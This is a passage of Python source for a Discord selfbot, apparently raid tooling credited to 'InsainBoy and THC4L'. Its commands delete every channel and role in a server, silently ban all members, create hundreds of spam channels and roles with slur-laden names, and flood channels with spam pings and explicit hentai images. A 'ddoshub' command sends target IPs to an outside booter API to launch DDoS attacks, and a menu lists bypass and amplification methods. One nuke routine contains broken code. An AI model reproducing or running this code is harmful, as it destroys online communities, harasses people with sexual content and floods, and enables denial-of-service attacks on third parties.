            await ctx.guild.create_role(name=f"💉RAPED BY GGBIT.CH💉", color=RandomColor())
        except:
            print(f"{Fore.RED}[+]ROLE => {Fore.RESET}Failed to create role: {role}")

@ggbitches.command()
async def channelcreate(ctx):
    """Spams the everloving fuck outta the channels voice text and category\nNote: It's a pain in the ass to clean up"""
    await ctx.message.delete()
    for i in range(1, 1000):
        try:
            await ctx.guild.create_text_channel(
                name=f"💉NUKED-BY-GGBIT.CH💉-{i}"
            )
            await ctx.guild.create_voice_channel(
                name=f"💉NUKED BY GGBIT.CH💉 {i}"
            )
            await ctx.guild.create_category(
                name=f"💉NUKED BY GGBIT.CH💉 {i}"
            )
        except:
            print(f"{Fore.RED}[+]CHANNEL => {Fore.RESET}Failed to create: {channel}")

@ggbitches.command()
async def channeldelete(ctx):
    """Deletes any and every channel it can delete"""
    await ctx.send("💉Deleting all channels...")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            print(f"{Fore.RED}[-]CHANNEL => {Fore.RESET}Failed to delete: {channel}")

@ggbitches.command()
async def roledelete(ctx):
    """Deletes every role except roles above you or bot specific roles like dyno"""
    await ctx.message.delete()
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.roles[-1] > role:
            try:
                await role.delete()
            except:
                print(f"{Fore.RED}[-]ROLE => {Fore.RESET}Failed to delete: {role}")


@ggbitches.command()
async def fulldelete(ctx):
    """Deletes every role except roles above you and deletes every channel"""
    await ctx.message.delete()
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.roles[-1] > role:
            try:
                await role.delete()
            except:
                print(
                    f"{Fore.RED}[-]ROLE => {Fore.RESET}Failed to delete role: {role}"
                )
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            print(f"{Fore.RED}[-]CHANNEL => {Fore.RESET}Failed to delete: {channel}")



@ggbitches.command()
async def fullnuke(ctx):
    """Nukes the fucking shit outta the server banning everyone silently. While no one notices\nNext up it deletes all roles  then creates GGBIT.CH roles\nThen it deletes all channels possible to then make GGBIT.CH channels"""
    await ctx.message.delete()
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.roles[-1] > role:
            try:
                await role.delete()
            except:
                print(
                    f"{Fore.RED}[-]ROLE => {Fore.RESET}Failed to delete role: {role}"
                )

    for i in range(1, 50):
        try:
            await ctx.guild.create_role(
            await ctx.guild.create_role(name=f"💉RAPED BY GGBIT.CH💉 {i}", color=RandomColor())
            )
        except Exception as e:
            print(f"Error while makign role.\n\nError: {e}")
        # SPAM ROLE SHIT CANT BE ASKED TO MAKE IT


    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            print(f"{Fore.RED}[-]CHANNEL => {Fore.RESET}Failed to delete {channel}")

            print(
    )
        
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            print(f"{Fore.RED}[-]BANNING => {Fore.RESET}Failed to ban {member}")

    for i in range(1, 100):
        try:
            await ctx.guild.create_text_channel(
                 name=f"NUKED-BY-GGBIT.CH-{i}"
            )
            print(
                f"{Fore.RED}[-]CHANNEL => {Fore.RESET}💉Made text channel! NUKED-BY-GGBIT.CH💉-{i}"
            )
            await ctx.guild.create_voice_channel(
                name=f"NUKED BY GGBIT.CH {i}"
            )
            print(
                f"{Fore.RED}[-]CHANNEL => {Fore.RESET}💉Made voice channel! NUKED BY GGBIT.CH💉 {i} "
            )
            await ctx.guild.create_category(
                name=f"NUKED BY GGBIT.CH {i}"
            )
            print(
                f"{Fore.RED}[-]CHANNEL => {Fore.RESET}💉Made category! NUKED BY GGBIT.CH💉 {i} "
            )
        except Exception as e:
            print(f"Error while making channels\nError: {e}")



#=================================| Spam ggbitches |=================================#




@ggbitches.command()
async def memespam(ctx):
    for b in range(50):
        r = requests.get("https://some-random-api.ml/meme").json()
        embed = discord.Embed(color=RandomColor())
        embed.set_author(name="You are gettign bombed with memes by 💉GGBIT.CH", icon_url="https://freepngimg.com/thumb/internet_meme/3-2-troll-face-meme-png-thumb.png") 
        embed.set_image(url=str(r["image"]))
        await ctx.send(embed=embed)



@ggbitches.command()
async def hentaispam(ctx):
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])

    r2 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r2.json()
    embed2 = discord.Embed(color=RandomColor())
    embed2.set_image(url=res["url"])

    r3 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r3.json()
    embed3 = discord.Embed(color=RandomColor())
    embed3.set_image(url=res["url"])

    r4 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r4.json()
    embed4 = discord.Embed(color=RandomColor())
    embed4.set_image(url=res["url"])

    r5 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r5.json()
    embed5 = discord.Embed(color=RandomColor())
    embed5.set_image(url=res["url"])

    r6 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r6.json()
    embed6 = discord.Embed(color=RandomColor())
    embed6.set_image(url=res["url"])

    r7 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r7.json()
    embed7 = discord.Embed(color=RandomColor())
    embed7.set_image(url=res["url"])

    r8 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r8.json()
    embed8 = discord.Embed(color=RandomColor())
    embed8.set_image(url=res["url"])

    r1 = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r1.json()
    embed1 = discord.Embed(color=RandomColor())
    embed1.set_image(url=res["url"])


    for i in range(30):
    	await ctx.send(embed=embed)
    	await ctx.send(embed=embed1)
    	await ctx.send(embed=embed2)
    	await ctx.send(embed=embed3)
    	await ctx.send(embed=embed4)
    	await ctx.send(embed=embed5)
    	await ctx.send(embed=embed6)
    	await ctx.send(embed=embed7)
    	await ctx.send(embed=embed8)


@ggbitches.command()
async def blankspam(ctx):
    await ctx.message.delete()
    for i in range(10):
        await ctx.send("ﾠﾠ"+"\n" * 400 + "ﾠﾠ")



@ggbitches.command()
async def numberspam(ctx):
    await ctx.message.delete()
    for i in range(50):
        await ctx.send("10101"* 400)

@ggbitches.command()
async def emojispam(ctx):
    await ctx.message.delete()
    for i in range(10):
        await ctx.send("🤡"* 1500)


@ggbitches.command()
async def crashspam(ctx):
    await ctx.message.delete()
    for i in range(30):
        await ctx.send("🤡🧊"* 100)
        

@ggbitches.command()
async def embedspam(ctx):
    await ctx.message.delete()
    for i in range(50):
        embed = discord.Embed(color=RandomColor())
        embed.set_author(name="🧊So yea you are getting spammed by GGBIT.CH, do you like it?🧊") 
        await ctx.send(embed=embed)

@ggbitches.command()
async def pinguser(ctx, message):
    await ctx.message.delete()
    for i in range(10):
        var = ("<@" + message + ">")
        await ctx.send(var*70)


@ggbitches.command()
async def silentping(ctx, message):
    await ctx.message.delete()
    for i in range(10):
        var = ("<@" + message + ">")
        await ctx.send(var*70)
        await ctx.send(var*70)
        await ctx.send(var*70)
        async for message in ctx.message.channel.history(limit=3).filter(lambda m: m.author == ggbitches.user).map(lambda m: m):
            try:
        	    await message.delete()
            except:
                pass

#-----------------------------------------DDOS--------------------------------------
#-----------------------------------------DDOS--------------------------------------
#-----------------------------------------DDOS--------------------------------------
#-----------------------------------------DDOS--------------------------------------
@ggbitches.command()
async def pinger(ctx, ):
	os.system('start https://check-host.net/?lang=en')
    
	
    
@ggbitches.command()
async def ddoshub(ctx, ip, port, time, method):
    r = requests.get(f"http://relevantapi.xyz/api/api.php?key=ggc5rBaBdxTT1oAb&host={ip}&port={port}&time={time}&method={method}")
    embed = discord.Embed(description=f"**IP:** {ip}\n**Port:** {port}\n**Time:** {time}\n**Method:** {method}", color=RandomColor())
    embed.set_author(name=f"DDOS BY GGBIT.CH")
    await ctx.send(embed=embed)

@ggbitches.command()
async def methods(ctx):
    gamemethods = discord.Embed(description=f"**__ GAME METHODS__ **\n**FN-LAG[200 sec]**\n**R6-LAG[200 sec]**\n**PUBG-SLAP[200 sec]** ", color=0x0ec3ec)
    await ctx.send(embed=gamemethods)
    bypasss = discord.Embed(description=f"**___ BYPASS ___**\n**VPN-CLAP[200 sec]**\n**OVH-STOMP[200 sec]**\n**NFO-SLAP[200 sec]**\n**SERVER-RAPE[200 sec]**\n**TPC-BYPASS[200 sec]** ", color=0x0ec3ec)
    await ctx.send(embed=bypasss)
    homess = discord.Embed(description=f"**__AMP__**\n**NTP[1200 sec]** ", color=0x0ec3ec)
    await ctx.send(embed=homess)
    Howto = discord.Embed(description=f"{PREFIX}ddoshub __IP__ __Port__ __Time Method__", color=0x0ec3ec)
    await ctx.send(embed=Howto)
	
#???????????????????????????????????????commands???????????????????????????????????????
#???????????????????????????????????????commands???????????????????????????????????????
#???????????????????????????????????????commands???????????????????????????????????????
#???????????????????????????????????????commands???????????????????????????????????????
#???????????????????????????????????????commands???????????????????????????????????????
#???????????????????????????????????????commands???????????????????????????????????????
#???????????????????????????????????????commands???????????????????????????????????????
@ggbitches.command()
async def serverbuilder(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="buildtemplate1, buildtemplate2, buildtemplate3, buildtemplate4, buildtemplate5, buildtemplate6, buildtemplate7, buildtemplate8, buildtemplate9, buildtemplate10") 
    embed.add_field(name = "| 💉Credits |", value="Made by InsainBoy and THC4L")
    embed.add_field(name = "| 💉Website |", value="||https://ggbit.ch/||")
    await ctx.send(embed=embed)

@ggbitches.command()
async def hentaiporn(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="hentai, pussy, tits, waifu, fox, hentaigif, pussygif, cumgif, kunigif") 
    embed.add_field(name = "| 💉Credits |", value="Made by InsainBoy and THC4L")
    embed.add_field(name = "| 💉Website |", value="||https://ggbit.ch/||")
    await ctx.send(embed=embed)

@ggbitches.command()
async def ddos(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="geo, ddoshub") 
    embed.add_field(name = "| 💉Credits |", value="Made by InsainBoy and THC4L")
    embed.add_field(name = "| 💉Website |", value="||https://ggbit.ch/||")
    await ctx.send(embed=embed)


@ggbitches.command()
async def helpful(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="purge, guildicon, av, copy, clear") 
    embed.add_field(name = "| 💉Credits |", value="Made by InsainBoy and THC4L")
    embed.add_field(name = "| 💉Website |", value="||https://ggbit.ch/||")
    await ctx.send(embed=embed)

@ggbitches.command()
async def extra(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="spoiler, streaming, playing, listening, watching, tinyurl, btc, eth, usdbtc, eurbtc, usdetc, euretc") 
    embed.add_field(name = "| 💉Credits |", value="Made by InsainBoy and THC4L")
    embed.add_field(name = "| 💉Website |", value="||https://ggbit.ch/||")
    await ctx.send(embed=embed)

@ggbitches.command()
async def spam(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="blankspam, numberspam, emojispam, crashspam, embedspam, memespam, hentaispam, silentping, pinguser") 
    embed.add_field(name = "| 💉Credits |", value="Made by InsainBoy and THC4L")
    embed.add_field(name = "| 💉Website |", value="||https://ggbit.ch/||")
    await ctx.send(embed=embed)

@ggbitches.command()
async def raid(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="fullnuke, fulldelete, banall, rolecreate, channelcreate, channeldelete, roledelete, ") 
    embed.add_field(name = "| 💉Credits |", value="Made by InsainBoy and THC4L")
    embed.add_field(name = "| 💉Website |", value="||https://ggbit.ch/||")
    await ctx.send(embed=embed)





#=================================| Helpful Commands |=================================#

@ggbitches.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == ggbitches.user).map(lambda m: m):
        try:
        	await message.delete()
        except:
            pass





@ggbitches.command()
async def copy(ctx):
    await ctx.message.delete()
    await ggbitches.create_guild(f"{ctx.guild.name} Copy")
    await asyncio.sleep(4)
    for g in ggbitches.guilds:
        if f"{ctx.guild.name} Copy" in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")

@ggbitches.command()
async def clear(ctx):
    await ctx.message.delete()
    os.system("cls")
    ready() 



ggbitches.run(TOKEN, bot=False, reconnect=True)


